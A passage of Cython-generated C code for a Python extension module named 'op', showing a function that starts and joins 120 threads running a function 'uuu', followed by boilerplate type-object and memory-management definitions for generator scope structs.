METH_NOARGS, 0};\nstatic PyObject *__pyx_pw_2op_21printing(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("printing (wrapper)", 0);\n  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);\n  __pyx_r = __pyx_pf_2op_20printing(__pyx_self);\n\n  \n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_20printing(CYTHON_UNUSED PyObject *__pyx_self) {\n  CYTHON_UNUSED long __pyx_v_i;\n  PyObject *__pyx_v_t = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  long __pyx_t_1;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  size_t __pyx_t_6;\n  PyObject *__pyx_t_7 = NULL;\n  int __pyx_t_8;\n  Py_ssize_t __pyx_t_9;\n  PyObject *(*__pyx_t_10)(PyObject *);\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("printing", 0);\n\n  \n  for (__pyx_t_1 = 0; __pyx_t_1 < 0x78; __pyx_t_1+=1) {\n    __pyx_v_i = __pyx_t_1;\n\n    \n    __pyx_t_3 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_threading); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 450, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_4);\n    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_Thread); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 450, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_uuu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 450, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_4);\n    __pyx_t_6 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_5))) {\n      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_5);\n      assert(__pyx_t_3);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n      __Pyx_INCREF(__pyx_t_3);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n      __pyx_t_6 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 1 : 0)] = {__pyx_t_3, NULL};\n      __pyx_t_7 = __Pyx_MakeVectorcallBuilderKwds(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 450, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_target, __pyx_t_4, __pyx_t_7, __pyx_callargs+1, 0) < (0)) __PYX_ERR(0, 450, __pyx_L1_error)\n      __pyx_t_2 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_5, __pyx_callargs+__pyx_t_6, (1-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_7);\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 450, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_2);\n    }\n    __Pyx_XDECREF_SET(__pyx_v_t, __pyx_t_2);\n    __pyx_t_2 = 0;\n\n    \n    __pyx_t_5 = __pyx_v_t;\n    __Pyx_INCREF(__pyx_t_5);\n    __pyx_t_6 = 0;\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};\n      __pyx_t_2 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_start, __pyx_callargs+__pyx_t_6, (1-__pyx_t_6) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 451, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_2);\n    }\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_threads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 452, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __pyx_t_8 = __Pyx_PyObject_Append(__pyx_t_2, __pyx_v_t); if (unlikely(__pyx_t_8 == ((int)-1))) __PYX_ERR(0, 452, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  }\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_threads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 454, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {\n    __pyx_t_5 = __pyx_t_2; __Pyx_INCREF(__pyx_t_5);\n    __pyx_t_9 = 0;\n    __pyx_t_10 = NULL;\n  } else {\n    __pyx_t_9 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 454, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __pyx_t_10 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 454, __pyx_L1_error)\n  }\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  for (;;) {\n    if (likely(!__pyx_t_10)) {\n      if (likely(PyList_CheckExact(__pyx_t_5))) {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_5);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 454, __pyx_L1_error)\n          #endif\n          if (__pyx_t_9 >= __pyx_temp) break;\n        }\n        __pyx_t_2 = __Pyx_PyList_GetItemRef(__pyx_t_5, __pyx_t_9);\n        ++__pyx_t_9;\n      } else {\n        {\n          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_5);\n          #if !CYTHON_ASSUME_SAFE_SIZE\n          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 454, __pyx_L1_error)\n          #endif\n          if (__pyx_t_9 >= __pyx_temp) break;\n        }\n        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        __pyx_t_2 = __Pyx_NewRef(PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_9));\n        #else\n        __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_5, __pyx_t_9);\n        #endif\n        ++__pyx_t_9;\n      }\n      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 454, __pyx_L1_error)\n    } else {\n      __pyx_t_2 = __pyx_t_10(__pyx_t_5);\n      if (unlikely(!__pyx_t_2)) {\n        PyObject* exc_type = PyErr_Occurred();\n        if (exc_type) {\n          if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) __PYX_ERR(0, 454, __pyx_L1_error)\n          PyErr_Clear();\n        }\n        break;\n      }\n    }\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_XDECREF_SET(__pyx_v_t, __pyx_t_2);\n    __pyx_t_2 = 0;\n\n    \n    __pyx_t_7 = __pyx_v_t;\n    __Pyx_INCREF(__pyx_t_7);\n    __pyx_t_6 = 0;\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_7, NULL};\n      __pyx_t_2 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_join, __pyx_callargs+__pyx_t_6, (1-__pyx_t_6) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 455, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_2);\n    }\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n    \n  }\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  \n\n  \n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_7);\n  __Pyx_AddTraceback("op.printing", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_t);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\nstatic PyObject *__pyx_tp_new_2op___pyx_scope_struct__genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {\n  PyObject *o;\n  #if CYTHON_COMPILING_IN_LIMITED_API\n  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);\n  o = alloc_func(t, 0);\n  #else\n  #if CYTHON_USE_FREELISTS\n  if (likely((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct__genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct__genexpr)))) {\n    o = (PyObject*)__pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct__genexpr[--__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct__genexpr];\n    memset(o, 0, sizeof(struct __pyx_obj_2op___pyx_scope_struct__genexpr));\n    (void) PyObject_INIT(o, t);\n    PyObject_GC_Track(o);\n  } else\n  #endif\n  {\n    o = (*t->tp_alloc)(t, 0);\n    if (unlikely(!o)) return 0;\n  }\n  #endif\n  return o;\n}\n\nstatic void __pyx_tp_dealloc_2op___pyx_scope_struct__genexpr(PyObject *o) {\n  struct __pyx_obj_2op___pyx_scope_struct__genexpr *p = (struct __pyx_obj_2op___pyx_scope_struct__genexpr *)o;\n  #if CYTHON_USE_TP_FINALIZE\n  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && !__Pyx_PyObject_GC_IsFinalized(o)) {\n    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_2op___pyx_scope_struct__genexpr) {\n      if (PyObject_CallFinalizerFromDealloc(o)) return;\n    }\n  }\n  #endif\n  PyObject_GC_UnTrack(o);\n  Py_CLEAR(p->__pyx_genexpr_arg_0);\n  Py_CLEAR(p->__pyx_v_i);\n  #if CYTHON_USE_FREELISTS\n  if (((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct__genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct__genexpr)))) {\n    __pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct__genexpr[__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct__genexpr++] = ((struct __pyx_obj_2op___pyx_scope_struct__genexpr *)o);\n  } else\n  #endif\n  {\n    #if CYTHON_USE_TYPE_SLOTS\n    (*Py_TYPE(o)->tp_free)(o);\n    #else\n    {\n      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);\n      if (tp_free) tp_free(o);\n    }\n    #endif\n  }\n}\n\nstatic int __pyx_tp_traverse_2op___pyx_scope_struct__genexpr(PyObject *o, visitproc v, void *a) {\n  int e;\n  struct __pyx_obj_2op___pyx_scope_struct__genexpr *p = (struct __pyx_obj_2op___pyx_scope_struct__genexpr *)o;\n  {\n    e = __Pyx_call_type_traverse(o, 1, v, a);\n    if (e) return e;\n  }\n  if (p->__pyx_genexpr_arg_0) {\n    e = (*v)(p->__pyx_genexpr_arg_0, a); if (e) return e;\n  }\n  if (p->__pyx_v_i) {\n    e = (*v)(p->__pyx_v_i, a); if (e) return e;\n  }\n  return 0;\n}\n#if CYTHON_USE_TYPE_SPECS\nstatic PyType_Slot __pyx_type_2op___pyx_scope_struct__genexpr_slots[] = {\n  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_2op___pyx_scope_struct__genexpr},\n  {Py_tp_traverse, (void *)__pyx_tp_traverse_2op___pyx_scope_struct__genexpr},\n  {Py_tp_new, (void *)__pyx_tp_new_2op___pyx_scope_struct__genexpr},\n  {0, 0},\n};\nstatic PyType_Spec __pyx_type_2op___pyx_scope_struct__genexpr_spec = {\n  "op.__pyx_scope_struct__genexpr",\n  sizeof(struct __pyx_obj_2op___pyx_scope_struct__genexpr),\n  0,\n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE,\n  __pyx_type_2op___pyx_scope_struct__genexpr_slots,\n};\n#else\n\nstatic PyTypeObject __pyx_type_2op___pyx_scope_struct__genexpr = {\n  PyVarObject_HEAD_INIT(0, 0)\n  "op.""__pyx_scope_struct__genexpr", \n  sizeof(struct __pyx_obj_2op___pyx_scope_struct__genexpr), \n  0, \n  __pyx_tp_dealloc_2op___pyx_scope_struct__genexpr, \n  #if PY_VERSION_HEX < 0x030800b4\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b4\n  0, \n  #endif\n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE, \n  0, \n  __pyx_tp_traverse_2op___pyx_scope_struct__genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if !CYTHON_USE_TYPE_SPECS\n  0, \n  #endif\n  0, \n  0, \n  __pyx_tp_new_2op___pyx_scope_struct__genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if CYTHON_USE_TP_FINALIZE\n  0, \n  #else\n  NULL, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)\n  0, \n  #endif\n  #if __PYX_NEED_TP_PRINT_SLOT == 1\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030C0000\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030d00A4\n  0, \n  #endif\n  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000\n  0, \n  #endif\n};\n#endif\n\nstatic PyObject *__pyx_tp_new_2op___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {\n  PyObject *o;\n  #if CYTHON_COMPILING_IN_LIMITED_API\n  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);\n  o = alloc_func(t, 0);\n  #else\n  #if CYTHON_USE_FREELISTS\n  if (likely((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_1_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct_1_genexpr)))) {\n    o = (PyObject*)__pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct_1_genexpr[--__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_1_genexpr];\n    memset(o, 0, sizeof(struct __pyx_obj_2op___pyx_scope_struct_1_genexpr));\n    (void) PyObject_INIT(o, t);\n    PyObject_GC_Track(o);\n  } else\n  #endif\n  {\n    o = (*t->tp_alloc)(t, 0);\n    if (unlikely(!o)) return 0;\n  }\n  #endif\n  return o;\n}\n\nstatic void __pyx_tp_dealloc_2op___pyx_scope_struct_1_genexpr(PyObject *o) {\n  struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *)o;\n  #if CYTHON_USE_TP_FINALIZE\n  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && !__Pyx_PyObject_GC_IsFinalized(o)) {\n    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_2op___pyx_scope_struct_1_genexpr) {\n      if (PyObject_CallFinalizerFromDealloc(o)) return;\n    }\n  }\n  #endif\n  PyObject_GC_UnTrack(o);\n  Py_CLEAR(p->__pyx_genexpr_arg_0);\n  Py_CLEAR(p->__pyx_v_i);\n  #if CYTHON_USE_FREELISTS\n  if (((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_1_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct_1_genexpr)))) {\n    __pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct_1_genexpr[__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *)o);\n  } else\n  #endif\n  {\n    #if CYTHON_USE_TYPE_SLOTS\n    (*Py_TYPE(o)->tp_free)(o);\n    #else\n    {\n      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);\n      if (tp_free) tp_free(o);\n    }\n    #endif\n  }\n}\n\nstatic int __pyx_tp_traverse_2op___pyx_scope_struct_1_genexpr(PyObject *o, visitproc v, void *a) {\n  int e;\n  struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_2op___pyx_scope_struct_1_genexpr *)o;\n  {\n    e = __Pyx_call_type_traverse(o, 1, v, a);\n    if (e) return e;\n  }\n  if (p->__pyx_genexpr_arg_0) {\n    e = (*v)(p->__pyx_genexpr_arg_0, a); if (e) return e;\n  }\n  if (p->__pyx_v_i) {\n    e = (*v)(p->__pyx_v_i, a); if (e) return e;\n  }\n  return 0;\n}\n#if CYTHON_USE_TYPE_SPECS\nstatic PyType_Slot __pyx_type_2op___pyx_scope_struct_1_genexpr_slots[] = {\n  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_2op___pyx_scope_struct_1_genexpr},\n  {Py_tp_traverse, (void *)__pyx_tp_traverse_2op___pyx_scope_struct_1_genexpr},\n  {Py_tp_new, (void *)__pyx_tp_new_2op___pyx_scope_struct_1_genexpr},\n  {0, 0},\n};\nstatic PyType_Spec __pyx_type_2op___pyx_scope_struct_1_genexpr_spec = {\n  "op.__pyx_scope_struct_1_genexpr",\n  sizeof(struct __pyx_obj_2op___pyx_scope_struct_1_genexpr),\n  0,\n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE,\n  __pyx_type_2op___pyx_scope_struct_1_genexpr_slots,\n};\n#else\n\nstatic PyTypeObject __pyx_type_2op___pyx_scope_struct_1_genexpr = {\n  PyVarObject_HEAD_INIT(0, 0)\n  "op.""__pyx_scope_struct_1_genexpr", \n  sizeof(struct __pyx_obj_2op___pyx_scope_struct_1_genexpr), \n  0, \n  __pyx_tp_dealloc_2op___pyx_scope_struct_1_genexpr, \n  #if PY_VERSION_HEX < 0x030800b4\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b4\n  0, \n  #endif\n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE, \n  0, \n  __pyx_tp_traverse_2op___pyx_scope_struct_1_genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if !CYTHON_USE_TYPE_SPECS\n  0, \n  #endif\n  0, \n  0, \n  __pyx_tp_new_2op___pyx_scope_struct_1_genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if CYTHON_USE_TP_FINALIZE\n  0, \n  #else\n  NULL, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)\n  0, \n  #endif\n  #if __PYX_NEED_TP_PRINT_SLOT == 1\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030C0000\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030d00A4\n  0, \n  #endif\n  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000\n  0, \n  #endif\n};\n#endif\n\nstatic PyObject *__pyx_tp_new_2op___pyx_scope_struct_2_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {\n  PyObject *o;\n  #if CYTHON_COMPILING_IN_LIMITED_API\n  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);\n  o = alloc_func(t, 0);\n  #else\n  #if CYTHON_USE_FREELISTS\n  if (likely((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_2_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct_2_genexpr)))) {\n    o = (PyObject*)__pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct_2_genexpr[--__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_2_genexpr];\n    memset(o, 0, sizeof(struct __pyx_obj_2op___pyx_scope_struct_2_genexpr));\n    (void) PyObject_INIT(o, t);\n    PyObject_GC_Track(o);\n  } else\n  #endif\n  {\n    o = (*t->tp_alloc)(t, 0);\n    if (unlikely(!o)) return 0;\n  }\n  #endif\n  return o;\n}\n\nstatic void __pyx_tp_dealloc_2op___pyx_scope_struct_2_genexpr(PyObject *o) {\n  struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *)o;\n  #if CYTHON_USE_TP_FINALIZE\n  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && !__Pyx_PyObject_GC_IsFinalized(o)) {\n    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_2op___pyx_scope_struct_2_genexpr) {\n      if (PyObject_CallFinalizerFromDealloc(o)) return;\n    }\n  }\n  #endif\n  PyObject_GC_UnTrack(o);\n  Py_CLEAR(p->__pyx_genexpr_arg_0);\n  Py_CLEAR(p->__pyx_v_i);\n  #if CYTHON_USE_FREELISTS\n  if (((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_2_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct_2_genexpr)))) {\n    __pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct_2_genexpr[__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_2_genexpr++] = ((struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *)o);\n  } else\n  #endif\n  {\n    #if CYTHON_USE_TYPE_SLOTS\n    (*Py_TYPE(o)->tp_free)(o);\n    #else\n    {\n      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);\n      if (tp_free) tp_free(o);\n    }\n    #endif\n  }\n}\n\nstatic int __pyx_tp_traverse_2op___pyx_scope_struct_2_genexpr(PyObject *o, visitproc v, void *a) {\n  int e;\n  struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_2op___pyx_scope_struct_2_genexpr *)o;\n  {\n    e = __Pyx_call_type_traverse(o, 1, v, a);\n    if (e) return e;\n  }\n  if (p->__pyx_genexpr_arg_0) {\n    e = (*v)(p->__pyx_genexpr_arg_0, a); if (e) return e;\n  }\n  if (p->__pyx_v_i) {\n    e = (*v)(p->__pyx_v_i, a); if (e) return e;\n  }\n  return 0;\n}\n#if CYTHON_USE_TYPE_SPECS\nstatic PyType_Slot __pyx_type_2op___pyx_scope_struct_2_genexpr_slots[] = {\n  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_2op___pyx_scope_struct_2_genexpr},\n  {Py_tp_traverse, (void *)__pyx_tp_traverse_2op___pyx_scope_struct_2_genexpr},\n  {Py_tp_new, (void *)__pyx_tp_new_2op___pyx_scope_struct_2_genexpr},\n  {0, 0},\n};\nstatic PyType_Spec __pyx_type_2op___pyx_scope_struct_2_genexpr_spec = {\n  "op.__pyx_scope_struct_2_genexpr",\n  sizeof(struct __pyx_obj_2op___pyx_scope_struct_2_genexpr),\n  0,\n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE,\n  __pyx_type_2op___pyx_scope_struct_2_genexpr_slots,\n};\n#else\n\nstatic PyTypeObject __pyx_type_2op___pyx_scope_struct_2_genexpr = {\n  PyVarObject_HEAD_INIT(0, 0)\n  "op.""__pyx_scope_struct_2_genexpr", \n  sizeof(struct __pyx_obj_2op___pyx_scope_struct_2_genexpr), \n  0, \n  __pyx_tp_dealloc_2op___pyx_scope_struct_2_genexpr, \n  #if PY_VERSION_HEX < 0x030800b4\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b4\n  0, \n  #endif\n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE, \n  0, \n  __pyx_tp_traverse_2op___pyx_scope_struct_2_genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if !CYTHON_USE_TYPE_SPECS\n  0, \n  #endif\n  0, \n  0, \n  __pyx_tp_new_2op___pyx_scope_struct_2_genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if CYTHON_USE_TP_FINALIZE\n  0, \n  #else\n  NULL, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)\n  0, \n  #endif\n  #if __PYX_NEED_TP_PRINT_SLOT == 1\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030C0000\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030d00A4\n  0, \n  #endif\n  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000\n  0, \n  #endif\n};\n#endif\n\nstatic PyObject *__pyx_tp_new_2op___pyx_scope_struct_3_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {\n  PyObject *o;\n  #if CYTHON_COMPILING_IN_LIMITED_API\n  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);\n  o = alloc_func(t, 0);\n  #else\n  #if CYTHON_USE_FREELISTS\n  if (likely((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_3_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct_3_genexpr)))) {\n    o = 